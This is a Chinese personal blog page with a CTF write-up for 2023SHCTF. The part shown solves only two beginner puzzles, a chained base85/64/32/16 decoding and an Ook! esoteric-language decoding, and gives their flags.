<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/0.jpg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/0.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/0.jpg">
  <link rel="mask-icon" href="/images/0.jpg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"dexterjie.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="2023SHCTF——Crypto——Wp">
<meta property="og:type" content="article">
<meta property="og:title" content="2023SHCTF">
<meta property="og:url" content="https://dexterjie.github.io/2023/10/30/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023SHCTF/index.html">
<meta property="og:site_name" content="DexterJie&#39;Blog">
<meta property="og:description" content="2023SHCTF——Crypto——Wp">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/0.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/1.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/2.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/3.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/4.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/5.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/6.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/23.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/24.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/7.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/8.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/9.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/10.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/11.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/27.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/28.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/26.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/25.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/29.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/30.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/31.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/12.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/13.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/14.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/15.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/16.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/17.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/18.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/19.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/20.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/21.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/where.jpg">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/22.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/flag.png">
<meta property="og:image" content="https://dexterjie.github.io/images/2023SHCTF/download.png">
<meta property="article:published_time" content="2023-10-30T04:22:57.000Z">
<meta property="article:modified_time" content="2023-10-31T14:08:47.202Z">
<meta property="article:author" content="DexterJie">
<meta property="article:tag" content="Wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://dexterjie.github.io/images/2023SHCTF/0.png">


<link rel="canonical" href="https://dexterjie.github.io/2023/10/30/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023SHCTF/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://dexterjie.github.io/2023/10/30/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023SHCTF/","path":"2023/10/30/赛题复现/2023SHCTF/","title":"2023SHCTF"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>2023SHCTF | DexterJie'Blog</title>
  







<link rel="dns-prefetch" href="waline-five-mocha.vercel.app">
  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">DexterJie'Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">诗酒趁年华</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1456890009&auto=1&height=66"></iframe>
    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Week1"><span class="nav-number">1.</span> <span class="nav-text">Week1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">1.1.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto-Checkin"><span class="nav-number">1.1.1.</span> <span class="nav-text">Crypto_Checkin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#I-am-very-ok"><span class="nav-number">1.1.2.</span> <span class="nav-text">I am very ok!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#really-ez-rsa"><span class="nav-number">1.1.3.</span> <span class="nav-text">really_ez_rsa</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#what-is-m"><span class="nav-number">1.1.4.</span> <span class="nav-text">what_is_m</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AE%8B%E7%BC%BA%E7%9A%84md5"><span class="nav-number">1.1.5.</span> <span class="nav-text">残缺的md5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%B5%E4%BF%A1%E8%AF%88%E9%AA%97"><span class="nav-number">1.1.6.</span> <span class="nav-text">电信诈骗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%9B%E8%AF%B4%EF%BC%9A%E5%8F%AA%E8%83%BD%E5%9B%9B%E5%A4%A9"><span class="nav-number">1.1.7.</span> <span class="nav-text">佛说：只能四天</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E6%9A%97%E4%B9%8B%E6%AD%8C"><span class="nav-number">1.1.8.</span> <span class="nav-text">黑暗之歌</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E5%88%B6"><span class="nav-number">1.1.9.</span> <span class="nav-text">进制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%AF%E6%92%92%E5%A4%A7%E5%B8%9D"><span class="nav-number">1.1.10.</span> <span class="nav-text">凯撒大帝</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%8B%E6%AD%A3"><span class="nav-number">1.1.11.</span> <span class="nav-text">立正</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%B7%E9%9B%BE%E9%87%8D%E9%87%8D"><span class="nav-number">1.1.12.</span> <span class="nav-text">迷雾重重</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%BE%E8%A8%80%E7%9A%84%E9%81%97%E6%86%BE"><span class="nav-number">1.1.13.</span> <span class="nav-text">难言的遗憾</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E5%85%94%E5%AD%90%E5%8F%AF%E7%88%B1%E6%8D%8F"><span class="nav-number">1.1.14.</span> <span class="nav-text">小兔子可爱捏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%86%8A%E6%96%90%E7%89%B9"><span class="nav-number">1.1.15.</span> <span class="nav-text">熊斐特</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#babyRCE"><span class="nav-number">1.2.1.</span> <span class="nav-text">babyRCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98"><span class="nav-number">1.2.2.</span> <span class="nav-text">飞机大战</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E5%B0%B1%E7%BB%99flag"><span class="nav-number">1.2.3.</span> <span class="nav-text">登录就给flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1zzphp"><span class="nav-number">1.2.4.</span> <span class="nav-text">1zzphp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E4%BD%A0%E7%9A%84%E9%82%80%E8%AF%B7%E5%87%BD"><span class="nav-number">1.2.5.</span> <span class="nav-text">生成你的邀请函</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">1.3.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nc"><span class="nav-number">1.3.1.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hard-nc"><span class="nav-number">1.3.2.</span> <span class="nav-text">hard nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%A3%E7%AE%97%E9%A2%98"><span class="nav-number">1.3.3.</span> <span class="nav-text">口算题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#showshowway"><span class="nav-number">1.3.4.</span> <span class="nav-text">showshowway</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E5%88%99%E8%BF%90%E7%AE%97%E5%99%A8"><span class="nav-number">1.3.5.</span> <span class="nav-text">四则运算器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re"><span class="nav-number">1.4.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-asm"><span class="nav-number">1.4.1.</span> <span class="nav-text">ez_asm</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-re"><span class="nav-number">1.4.2.</span> <span class="nav-text">easy_re</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#signin"><span class="nav-number">1.4.3.</span> <span class="nav-text">signin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-math"><span class="nav-number">1.4.4.</span> <span class="nav-text">easy_math</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-apk"><span class="nav-number">1.4.5.</span> <span class="nav-text">ez_apk</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#seed"><span class="nav-number">1.4.6.</span> <span class="nav-text">seed</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">1.5.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#message"><span class="nav-number">1.5.1.</span> <span class="nav-text">message</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">1.5.2.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BE%E5%B7%A5"><span class="nav-number">1.5.3.</span> <span class="nav-text">社工</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E7%88%B1%E7%9A%84%E6%B4%BE%E8%92%99"><span class="nav-number">1.5.4.</span> <span class="nav-text">可爱的派蒙</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezmisc"><span class="nav-number">1.5.5.</span> <span class="nav-text">ezmisc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B9%9F%E8%AE%B8%E9%9C%80%E8%A6%81%E4%B8%80%E7%82%B9py"><span class="nav-number">1.5.6.</span> <span class="nav-text">也许需要一点py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Steganography"><span class="nav-number">1.5.7.</span> <span class="nav-text">Steganography</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%9F%E7%9A%84%E7%AD%BE%E5%88%B0"><span class="nav-number">1.5.8.</span> <span class="nav-text">真的签到</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week2"><span class="nav-number">2.</span> <span class="nav-text">Week2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-1"><span class="nav-number">2.1.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#e"><span class="nav-number">2.1.1.</span> <span class="nav-text">e?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-rsa"><span class="nav-number">2.1.2.</span> <span class="nav-text">ez_rsa</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#part1"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">part1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#part2"><span class="nav-number">2.1.2.2.</span> <span class="nav-text">part2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#factorizing-n"><span class="nav-number">2.1.3.</span> <span class="nav-text">factorizing_n</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XOR"><span class="nav-number">2.1.4.</span> <span class="nav-text">XOR</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easymath"><span class="nav-number">2.1.5.</span> <span class="nav-text">easymath</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashes"><span class="nav-number">2.1.6.</span> <span class="nav-text">hashes</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re-1"><span class="nav-number">2.2.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pycode"><span class="nav-number">2.2.1.</span> <span class="nav-text">pycode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">2.3.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E5%9C%A8%E5%A4%A9%E8%BE%B9%E8%BF%91%E5%9C%A8%E7%9C%BC%E5%89%8D"><span class="nav-number">2.3.1.</span> <span class="nav-text">远在天边近在眼前</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E7%88%B1%E7%9A%84%E6%B4%9B%E7%90%AA%E5%B8%8C"><span class="nav-number">2.3.2.</span> <span class="nav-text">可爱的洛琪希</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week3"><span class="nav-number">3.</span> <span class="nav-text">Week3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-2"><span class="nav-number">3.1.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%92%A4%E9%80%80"><span class="nav-number">3.1.1.</span> <span class="nav-text">撤退</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ECC"><span class="nav-number">3.1.2.</span> <span class="nav-text">ECC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A5%BD%E5%A5%BD%E5%A5%BD%EF%BC%81"><span class="nav-number">3.1.3.</span> <span class="nav-text">好好好！</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Classical-master"><span class="nav-number">3.1.4.</span> <span class="nav-text">Classical master</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3"><span class="nav-number">3.1.5.</span> <span class="nav-text">3!!!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easyrsa"><span class="nav-number">3.1.6.</span> <span class="nav-text">easyrsa</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="DexterJie"
      src="/images/0.jpg">
  <p class="site-author-name" itemprop="name">DexterJie</p>
  <div class="site-description" itemprop="description">一枚Crypto新手</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">50</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">22</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://dexterjie.github.io/2023/10/30/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023SHCTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/0.jpg">
      <meta itemprop="name" content="DexterJie">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="DexterJie'Blog">
      <meta itemprop="description" content="一枚Crypto新手">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="2023SHCTF | DexterJie'Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          2023SHCTF
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-10-30 12:22:57" itemprop="dateCreated datePublished" datetime="2023-10-30T12:22:57+08:00">2023-10-30</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-10-31 22:08:47" itemprop="dateModified" datetime="2023-10-31T22:08:47+08:00">2023-10-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Wp/" itemprop="url" rel="index"><span itemprop="name">Wp</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
  
  <span class="post-meta-item">
    
    <span class="post-meta-item-icon">
      <i class="far fa-comment"></i>
    </span>
    <span class="post-meta-item-text">Waline：</span>
  
    <a title="waline" href="/2023/10/30/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023SHCTF/#waline" itemprop="discussionUrl">
      <span class="post-comments-count waline-comment-count" data-path="/2023/10/30/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023SHCTF/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>9.7k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>35 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>2023SHCTF——Crypto——Wp</p>
<span id="more"></span>

<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto-Checkin"><a href="#Crypto-Checkin" class="headerlink" title="Crypto_Checkin"></a>Crypto_Checkin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QZZ|KQbjRRS8QZRQdCYwR4_DoQ7~jyO&gt;0t4R4__aQZQ9|Rz+k_Q!r#mR90+NR4_4NR%&gt;ipO&gt;0s&#123;R90|SQhHKhRz+k^S8Q5JS5|OUQZO&#125;CQfp*dS8P&amp;9R8&gt;k?QZYthRz+k_O&gt;0#&gt;</span><br></pre></td></tr></table></figure>

<p><strong>base85</strong> –&gt; <strong>base64</strong> –&gt; <strong>base32</strong> –&gt; <strong>base16</strong></p>
<p><code>flag&#123;Th1s_1s_B4s3_3nc0d3&#125;</code></p>
<h3 id="I-am-very-ok"><a href="#I-am-very-ok" class="headerlink" title="I am very ok!"></a>I am very ok!</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!</span><br><span class="line">Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook.</span><br><span class="line">Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook.</span><br><span class="line">Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.</span><br><span class="line">Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook?</span><br><span class="line">Ook. </span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">Ook解密</a>得到<code>flag&#123;123456789&#125;</code></p>
